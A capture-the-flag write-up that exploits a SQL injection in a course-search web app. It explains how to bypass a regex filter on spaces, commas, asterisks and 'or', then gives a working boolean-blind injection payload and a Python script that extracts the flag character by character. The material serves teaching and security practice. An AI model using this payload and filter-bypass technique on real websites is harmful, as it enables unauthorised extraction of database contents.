<img width="547" height="691" alt="image" src="https://github.com/user-attachments/assets/c4e24e21-ca68-4b05-a94e-d2bca39ab091" />

<img width="825" height="317" alt="image" src="https://github.com/user-attachments/assets/44048e53-300d-4b6f-8f93-b01f74b02a1b" />

#### Overview

We are provided with the web portal for a "University Course Portal" and its backend source code (`app.py`, `init.sql`, `index.html`). The application features a single search box that queries a MySQL database for course names.

The flag is stored inside a database table named `flag`.

#### Source Code Review & Vulnerability Discovery

Looking at `app.py`, the search query is constructed via standard insecure string concatenation:

```python
query = f"SELECT * FROM courses WHERE course_name LIKE '%{search_term}%'"
```

This is a textbook **SQL Injection (SQLi)** vulnerability. However, the developer implemented a strict custom Web Application Firewall (WAF) using Python regex right above it:

```python
if (re.search(r'\s|,|\*', search_term, re.IGNORECASE) or
        re.search(r'\bor\b', search_term, re.IGNORECASE)):
    return abort(403)
```

Furthermore, any broken SQL syntax triggers a broad `try...except` block that also spits out a `403 Forbidden`:

```python
try:
    cursor.execute(query)
    # ...
except Exception:
    return abort(403)
```

#### The WAF Rules:

1. **No Spaces** (`\s`)
2. **No Commas** (`,`)
3. **No Asterisks** ()
4. **No standalone word "OR"** (`\bor\b` case-insensitive)
5. **No syntax errors allowed** (Blind standard `403` response).

#### Devising the Bypass Strategy

Because commas are banned, a standard `UNION SELECT` exfiltration attack is impossible (we cannot write `UNION SELECT 1, 2, flag, 4` to match the 4 columns of the `courses` table). We are forced to use a **Boolean Blind SQL Injection** attack.

We must bypass the WAF constraints one by one:

- **Bypassing `OR`:** In MySQL, the logical operator `||` is fully synonymous with `OR`.
- **Bypassing Spaces:** In SQL, parentheses act as valid token delimiters. The parser reads `SELECT(flag_value)FROM(flag)` identically to `SELECT flag_value FROM flag`.
- **Avoiding the Decoy Flag:** Inspecting `init.sql` reveals a trap:
    
    ```sql
    INSERT IGNORE INTO flag (flag_value) VALUES ('HNYX{fake_flag}');
    ```
    
<img width="1002" height="147" alt="image" src="https://github.com/user-attachments/assets/fa825f3a-d0b3-4930-95a4-be2fe39dfc3f" />
    
    If our subquery grabs *all* rows from the `flag` table, MySQL will throw a `Subquery returns more than 1 row` fatal error, triggering the `except` block's 403. We must explicitly instruct our payload to ignore the fake flag.
    

#### Constructing the Oracle

We need to build an "Oracle"—a statement that forces the webpage to display the normal university courses if our injected question is **True**, and return a blank results page if our question is **False**.

We construct the payload using the logic: `[False] || [Our Subquery] || [False]`

#### The Oracle Payload:

```sql
k0tak%'||((SELECT(flag_value)FROM(flag)WHERE(flag_value)!='HNYX{fake_flag}')LIKE(BINARY('HNYX{%')))||'%
```

<img width="732" height="702" alt="image" src="https://github.com/user-attachments/assets/83057421-b1b3-4883-b0e1-9f2d742af1d1" />

**How MySQL evaluates this when dropped into the backend:**

1. `course_name LIKE '%k0tak%'` $\rightarrow$ **`False`** (No course is named k0tak).
2. `SELECT flag... LIKE BINARY 'HNYX{%'` $\rightarrow$ **`True`** (The real flag starts with HNYX{).
3. `'%%'` $\rightarrow$ **`False`**.
4. Result: `False || True || False` $\rightarrow$ **`True`**.

The webpage successfully renders the 8 courses. If we test `HNYX{Z%`, the middle statement becomes `False`, the total statement becomes `False`, and the webpage renders **0 courses**. We now have a working True/False binary question system.

#### The Exploit Script

Because guessing a string character-by-character by hand is impractical, we automate the Oracle using Python.

*Crucial detail:* We must include standard punctuation in our character set (`charset`), specifically the exclamation mark `!`, or the script will get trapped in an infinite loop at the very end of the flag.

```python
import requests
import string
import sys

URL = "http://ee94e01f-0f0c-40b6-bf1c-aed95ed08103.34.143.189.39.sslip.io:8001/"

# We include standard punctuation, but manually strip out the banned ',' and '*'
charset = string.ascii_letters + string.digits + "_{}!?@#$-"

known_flag = "HNYX{"
print(f"[*] Starting Blind SQLi Exfiltration...")
print(f"[*] Flag: {known_flag}", end="", flush=True)

while not known_flag.endswith("}"):
    for char in charset:
        # MySQL 'LIKE' treats '_' as a single-char wildcard. We must escape it as '\_'
        safe_char = char
        if char == "_":
            safe_char = "\\_"

        test_string = known_flag + safe_char

        # Double {{ }} is required in Python f-strings to pass a literal single '{'
        payload = f"k0tak%'||((SELECT(flag_value)FROM(flag)WHERE(flag_value)!='HNYX{{fake_flag}}')LIKE(BINARY('{test_string}%')))||'%"

        r = requests.post(URL, data={"search": payload})

        # 'CS101' appears in the HTML table ONLY if the SQL statement resolved to TRUE
        if "CS101" in r.text:
            known_flag += char
            print(char, end="", flush=True)
            break

    else:
        print("\n[!] Error: Loop exhausted charset without a match. Check your charset!")
        sys.exit(1)

print("\n\n[+] Exfiltration complete!")
```

#### Execution Output:

Plaintext

```bash
$ python3 solve.py
[*] Starting Blind SQLi Exfiltration...
[*] Flag: HNYX{Alw4yS_s4n1TiZ3_y0uR_InPuT!}

[+] Exfiltration complete!
```

**Flag:** `HNYX{Alw4yS_s4n1TiZ3_y0uR_InPuT!}`
